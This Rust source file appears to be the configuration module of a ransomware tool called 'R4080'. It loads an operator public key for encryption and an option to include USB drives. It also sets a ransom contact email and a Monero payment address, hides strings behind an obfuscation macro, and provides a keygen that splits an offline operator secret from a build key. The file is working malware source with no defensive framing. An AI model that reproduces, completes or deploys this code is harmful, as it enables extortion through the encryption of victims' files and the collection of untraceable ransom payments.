use std::path::PathBuf;

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use rand::rngs::OsRng;
use rand::RngCore;
use x25519_dalek::{PublicKey, StaticSecret};

include!(concat!(env!("OUT_DIR"), "/baked.rs"));

pub struct Config {
    pub operator_pubkey: [u8; 32],
    pub include_removable: bool,
    pub contact: String,
    pub xmr_address: String,
}

fn baked_str(raw: &[u8]) -> Option<String> {
    if raw.is_empty() {
        None
    } else {
        Some(crate::obf::dec(raw))
    }
}

fn runtime_or_baked(runtime: &str, baked: Option<String>, fallback: &str) -> String {
    std::env::var(runtime)
        .ok()
        .or(baked)
        .unwrap_or_else(|| fallback.to_string())
}

/// Accept both a bare address and the legacy `monero-address=...` form.
fn normalize_xmr(raw: &str) -> String {
    let trimmed = raw.trim();
    let value = trimmed
        .strip_prefix("monero-address=")
        .or_else(|| trimmed.strip_prefix("XMR:"))
        .or_else(|| trimmed.strip_prefix("xmr:"))
        .unwrap_or(trimmed);
    value.trim().trim_matches('"').trim().to_string()
}

impl Config {
    pub fn load() -> Result<Config, String> {
        let opk = std::env::var("R4080_OPK")
            .ok()
            .or_else(|| baked_str(BAKED_OPK))
            .ok_or_else(|| {
                "R4080_OPK missing: build with R4080_OPK=<public-b64> or set it at runtime"
                    .to_string()
            })?;
        let raw = B64
            .decode(opk.trim())
            .map_err(|_| "R4080_OPK is not valid base64".to_string())?;
        if raw.len() != 32 {
            return Err("R4080_OPK must decode to 32 bytes".to_string());
        }
        let mut operator_pubkey = [0u8; 32];
        operator_pubkey.copy_from_slice(&raw);

        let include_removable = std::env::var("R4080_USB")
            .map(|v| v == "1")
            .unwrap_or(false);

        let contact = runtime_or_baked(
            "R4080_CONTACT",
            baked_str(BAKED_CONTACT),
            &crate::obf!("recovery-service@protonmail.com"),
        );
        let xmr_address = normalize_xmr(&runtime_or_baked(
            "R4080_XMR_ADDR",
            baked_str(BAKED_XMR),
            &crate::obf!("R4080_XMR_ADDR_NOT_CONFIGURED"),
        ));

        Ok(Config {
            operator_pubkey,
            include_removable,
            contact,
            xmr_address,
        })
    }
}

#[cfg(windows)]
pub fn data_dir() -> PathBuf {
    std::env::var("LOCALAPPDATA")
        .map(PathBuf::from)
        .unwrap_or_else(|_| std::env::temp_dir())
        .join("m3t4encryp7or")
}

#[cfg(not(windows))]
pub fn data_dir() -> PathBuf {
    std::env::var("R4080_DATA")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("/tmp/r4080-data"))
}

pub fn keygen() {
    let mut secret_bytes = [0u8; 32];
    OsRng.fill_bytes(&mut secret_bytes);
    let secret = StaticSecret::from(secret_bytes);
    let public = PublicKey::from(&secret);
    println!("operator secret (offline): {}", B64.encode(secret.to_bytes()));
    println!("operator public (build):   {}", B64.encode(public.as_bytes()));
}
